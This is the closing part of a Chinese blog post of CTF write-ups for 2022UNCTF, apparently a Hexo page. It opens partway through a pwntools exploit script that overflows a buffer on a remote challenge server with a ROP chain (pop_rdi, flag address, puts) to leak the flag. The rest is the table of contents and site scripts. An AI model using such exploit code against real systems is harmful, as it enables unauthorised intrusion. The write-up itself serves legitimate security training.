class="string">&quot;node.yuzhian.com.cn&quot;</span>,<span class="number">34684</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;120&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please input size: \n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\r-671231&quot;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line">pop_rdi = <span class="number">0x400a53</span></span><br><span class="line">flag = <span class="number">0x6010c0</span></span><br><span class="line">puts = <span class="number">0x4008BB</span></span><br><span class="line">payload = flat(padding,pop_rdi,flag,puts)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171839673.png" alt="image-20230711171839673"></p>
<p>flag: <code>UNCTF&#123;e9230acd-ece3-4991-a1fd-c2a75fb8803a&#125;</code></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://slagman34.github.io">Slagman</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://slagman34.github.io/2023/07/11/2022UNCTF/">https://slagman34.github.io/2023/07/11/2022UNCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://slagman34.github.io" target="_blank">Slagman</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/Pictures/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/Pictures/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/Pictures/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/Pictures/alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/11/2022NepCTF/" title="2022NepCTF"><img class="cover" src="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022NepCTF</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/11/2022CISCN%E5%88%9D%E8%B5%9B/" title="2022CISCN华东南赛区初赛"><img class="cover" src="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022CISCN华东南赛区初赛</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/12/2023HDCTF/" title="2023HDCTF"><img class="cover" src="https://s2.loli.net/2023/07/10/5UDo4IXBkgQ2JWp.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-12</div><div class="title">2023HDCTF</div></div></a></div><div><a href="/2023/07/11/2022NepCTF/" title="2022NepCTF"><img class="cover" src="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-11</div><div class="title">2022NepCTF</div></div></a></div><div><a href="/2023/07/12/2023HZNUCTF/" title="2023HZNUCTF"><img class="cover" src="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-12</div><div class="title">2023HZNUCTF</div></div></a></div><div><a href="/2023/07/12/2023LitCTF/" title="2023LitCTF"><img class="cover" src="https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-12</div><div class="title">2023LitCTF</div></div></a></div><div><a href="/2023/07/12/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/" title="2023陕西省赛"><img class="cover" src="https://s2.loli.net/2023/07/10/5UDo4IXBkgQ2JWp.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-12</div><div class="title">2023陕西省赛</div></div></a></div><div><a href="/2023/08/26/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="2023蓝帽杯初赛取证"><img class="cover" src="https://s2.loli.net/2023/07/10/5UDo4IXBkgQ2JWp.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-26</div><div class="title">2023蓝帽杯初赛取证</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E5%A4%AA%E5%96%9C%E6%AC%A2bilibili%E5%A4%A7%E5%AD%A6%E5%95%A6"><span class="toc-number">1.1.</span> <span class="toc-text">我太喜欢bilibili大学啦</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezgame"><span class="toc-number">1.2.</span> <span class="toc-text">ezgame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.3.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-number">1.4.</span> <span class="toc-text">babyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-upload"><span class="toc-number">1.5.</span> <span class="toc-text">easy_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E5%A4%AA%E5%96%9C%E6%AC%A2bilibili%E5%A4%A7%E5%AD%A6%E5%95%A6%E4%BF%AE%E5%A4%8D%E7%89%88"><span class="toc-number">1.6.</span> <span class="toc-text">我太喜欢bilibili大学啦修复版</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E5%88%80"><span class="toc-number">1.7.</span> <span class="toc-text">给你一刀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-ssti"><span class="toc-number">1.8.</span> <span class="toc-text">easy ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#302%E4%B8%8E%E6%B7%B1%E5%A4%A7"><span class="toc-number">1.9.</span> <span class="toc-text">302与深大</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AC%E8%AF%B4php%E6%9C%89%E4%B8%80%E4%B8%AAxxe"><span class="toc-number">1.10.</span> <span class="toc-text">听说php有一个xxe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babynode"><span class="toc-number">1.11.</span> <span class="toc-text">babynode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.12.</span> <span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez2048"><span class="toc-number">1.13.</span> <span class="toc-text">ez2048</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-rce"><span class="toc-number">1.14.</span> <span class="toc-text">easy_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poppop"><span class="toc-number">1.15.</span> <span class="toc-text">poppop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#whereisyourkey"><span class="toc-number">2.1.</span> <span class="toc-text">whereisyourkey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzzzre"><span class="toc-number">2.2.</span> <span class="toc-text">ezzzzre</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-1"><span class="toc-number">3.1.</span> <span class="toc-text">md5-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dddd"><span class="toc-number">3.2.</span> <span class="toc-text">dddd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#caesar"><span class="toc-number">3.3.</span> <span class="toc-text">caesar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-2"><span class="toc-number">3.4.</span> <span class="toc-text">md5-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezRSA"><span class="toc-number">3.5.</span> <span class="toc-text">ezRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Single-table"><span class="toc-number">3.6.</span> <span class="toc-text">Single table</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Multi-table"><span class="toc-number">3.7.</span> <span class="toc-text">Multi table</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyRSA"><span class="toc-number">3.8.</span> <span class="toc-text">babyRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-RSA"><span class="toc-number">3.9.</span> <span class="toc-text">easy_RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezxor"><span class="toc-number">3.10.</span> <span class="toc-text">ezxor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8A%E6%99%9A%E5%90%83%E4%BB%80%E4%B9%88"><span class="toc-number">3.11.</span> <span class="toc-text">今晚吃什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Today-is-Thursday-V-me-50"><span class="toc-number">3.12.</span> <span class="toc-text">Today_is_Thursday_V_me_50</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#magic-word"><span class="toc-number">4.1.</span> <span class="toc-text">magic_word</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%BE%97%E5%88%B0%E6%88%91%E5%90%97"><span class="toc-number">4.2.</span> <span class="toc-text">找得到我吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syslog"><span class="toc-number">4.3.</span> <span class="toc-text">syslog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BE%E4%BB%80%E4%B9%88%E7%A4%BE"><span class="toc-number">4.4.</span> <span class="toc-text">社什么社</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#In-the-Morse-Garden"><span class="toc-number">4.5.</span> <span class="toc-text">In_the_Morse_Garden</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A8%E9%B1%BC"><span class="toc-number">4.6.</span> <span class="toc-text">巨鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zhiyin"><span class="toc-number">4.7.</span> <span class="toc-text">zhiyin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E5%92%8Cfan"><span class="toc-number">4.8.</span> <span class="toc-text">清和fan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E5%B0%8F%E5%BF%83%E6%B5%B7%E4%B9%9F%E7%BB%9D%E9%9D%9E%E9%B3%9D%E7%B1%BB"><span class="toc-number">4.9.</span> <span class="toc-text">我小心海也绝非鳝类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8A%9D%E9%BA%BB%E5%BC%80%E9%97%A8"><span class="toc-number">4.10.</span> <span class="toc-text">芝麻开门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#welcomeUNCTF2022"><span class="toc-number">5.1.</span> <span class="toc-text">welcomeUNCTF2022</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83"><span class="toc-number">5.2.</span> <span class="toc-text">石头剪刀布</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#move-your-heart"><span class="toc-number">5.3.</span> <span class="toc-text">move your heart</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">5.4.</span> <span class="toc-text">checkin</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2023/07/10/eM7GL5mcOtFQfsk.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Slagman</div><div class="footer_custom_text">Hi, welcome to my <a href="https://slagman34.github.io/">blog</a>!</div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7LWqAsgWrHMxukVCOXmCNx1C-gzGzoHsz',
      appKey: 'ayVeMOqRX6IzxiauVpTYL8Pe',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'https://slagman34.github.io/2023/07/11/2022UNCTF/'
    this.page.identifier = '/2023/07/11/2022UNCTF/'
    this.page.title = '2022UNCTF'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://slagman.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var qweather_key = '4e2dbfcc8c774ce181570d4c821bfa8a';
  var gaud_map_key = '38be22b8a953e0b19d5f72de5132c334';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.6534116,27.96920845';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>